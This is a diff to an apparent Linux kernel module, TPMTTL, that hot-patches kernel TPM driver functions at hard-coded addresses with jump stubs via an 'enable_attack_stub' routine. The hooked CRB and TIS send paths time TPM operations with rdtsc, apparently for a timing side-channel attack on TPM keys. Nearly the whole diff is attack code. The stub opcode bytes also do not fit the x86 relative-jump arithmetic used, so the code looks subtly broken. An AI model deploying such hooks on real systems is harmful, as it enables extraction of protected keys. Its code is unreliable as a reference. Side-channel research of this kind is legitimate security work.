@@ -5,14 +5,17 @@
 #include <linux/fs.h>
 #include <linux/tpm.h>
 
-#include "../tpmttl.h"
+#include "tpmttl.h"
 
 
-unsigned long long pcrb_send = 0xffffffff81b2fb00;
+unsigned long long pcrb_send            = 0xffffffff81b2fb00;
+unsigned long long ptpm_tcg_write_bytes = 0xffffffff81b2ef10;
 
 unsigned char nop_stub[] = {0x13, 0x00, 0x00, 0x00, 0x00};
 unsigned char jmp_stub[] = {0x6f, 0x00, 0x00, 0x00, 0x00};
 
+
+//!!!!!!!!!! For CRB
 enum crb_start {
 	CRB_START_INVOKE	= BIT(0),
 };
@@ -54,11 +57,85 @@ struct crb_priv {
 	u32 __iomem *pluton_reply_addr;
 };
 
+
+//!!!!!!!!!! For TIS
+enum tis_status {
+	TPM_STS_VALID = 0x80,
+	TPM_STS_COMMAND_READY = 0x40,
+	TPM_STS_GO = 0x20,
+	TPM_STS_DATA_AVAIL = 0x10,
+	TPM_STS_DATA_EXPECT = 0x08,
+	TPM_STS_RESPONSE_RETRY = 0x02,
+	TPM_STS_READ_ZERO = 0x23,
+};
+
+enum tpm_tis_io_mode {
+	TPM_TIS_PHYS_8,
+	TPM_TIS_PHYS_16,
+	TPM_TIS_PHYS_32,
+};
+
+struct tpm_tis_phy_ops {
+	int (*read_bytes)(struct tpm_tis_data *data, u32 addr, u16 len,
+			  u8 *result, enum tpm_tis_io_mode mode);
+	int (*write_bytes)(struct tpm_tis_data *data, u32 addr, u16 len,
+			   const u8 *value, enum tpm_tis_io_mode mode);
+	int (*verify_crc)(struct tpm_tis_data *data, size_t len,
+			  const u8 *value);
+};
+
+struct tpm_tis_data {
+	struct tpm_chip *chip;
+	u16 manufacturer_id;
+	struct mutex locality_count_mutex;
+	unsigned int locality_count;
+	int locality;
+	int irq;
+	struct work_struct free_irq_work;
+	unsigned long last_unhandled_irq;
+	unsigned int unhandled_irqs;
+	unsigned int int_mask;
+	unsigned long flags;
+	void __iomem *ilb_base_addr;
+	u16 clkrun_enabled;
+	wait_queue_head_t int_queue;
+	wait_queue_head_t read_queue;
+	const struct tpm_tis_phy_ops *phy_ops;
+	unsigned short rng_quality;
+	unsigned int timeout_min;
+	unsigned int timeout_max;
+};
+
+struct tpm_tis_tcg_phy {
+	struct tpm_tis_data priv;
+	void __iomem *iobase;
+};
+
+#ifdef CONFIG_PREEMPT_RT
+static inline void tpm_tis_flush(void __iomem *iobase)
+{
+	ioread8(iobase + TPM_ACCESS(0));
+}
+#else
+#define tpm_tis_flush(iobase) do { } while (0)
+#endif
+
+static inline void tpm_tis_iowrite8(u8 b, void __iomem *iobase, u32 addr)
+{
+	iowrite8(b, iobase + addr);
+	tpm_tis_flush(iobase);
+}
+
+
 #define	TPM_STS(l)			(0x0018 | ((l) << 12))
 
 
 static noinline int internal_crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len);
 static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len);
+
+static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode);
+static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode);
+
 
 unsigned long long tscrequest[1000] = {0};
 unsigned long long requestcnt = 0;
@@ -77,6 +154,13 @@ static void enable_attack_stub()
   jmp_stub[4] = ((char*)&target_addr)[3];
   memcpy((void*)pcrb_send, jmp_stub, sizeof(jmp_stub));
 
+  target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
+  jmp_stub[1] = ((char*)&target_addr)[0];
+  jmp_stub[2] = ((char*)&target_addr)[1];
+  jmp_stub[3] = ((char*)&target_addr)[2];
+  jmp_stub[4] = ((char*)&target_addr)[3];
+  memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
+
   // write_cr0(read_cr0() | X86_CR0_WP);
  
   printk("TPMTTL: ENABLED\n");
@@ -87,7 +171,9 @@ static void disable_attack_stub()
 {  
   // write_cr0(read_cr0() & (~X86_CR0_WP));
 
-  memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));  
+  memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));
+
+  memcpy((void*)ptpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
 
   // write_cr0(read_cr0() | X86_CR0_WP);
 
@@ -193,6 +279,37 @@ static noinline int internal_crb_send_handler(struct tpm_chip *chip, u8 *buf, si
 static int crb_send_handler(struct tpm_chip *chip, u8 *buf, size_t len)
 {
   return internal_crb_send_handler(chip, buf, len);
+}
+
+
+static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode)
+{
+  unsigned long t;
+  struct tpm_tis_tcg_phy *phy = container_of(data, struct tpm_tis_tcg_phy, priv);
+
+  if (len == 1 && *value == TPM_STS_GO && TPM_STS(data->locality) == addr) {
+    wmb();
+    t = rdtsc();
+    rmb();
+    tpm_tis_iowrite8(*value, phy->iobase, addr);
+
+    while (!(ioread8(phy->iobase + addr) & TPM_STS_DATA_AVAIL));
+
+    rmb();
+
+    tscrequest[requestcnt++] = rdtsc() - t;
+  } else {
+    while (len--)
+      tpm_tis_iowrite8(*value++, phy->iobase, addr);
+  }
+
+  return 0;
+}
+
+
+static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value, enum tpm_tis_io_mode io_mode)
+{
+  return internal_tpm_tcg_write_bytes_handler(data, addr, len, value, io_mode);
 }
 
 
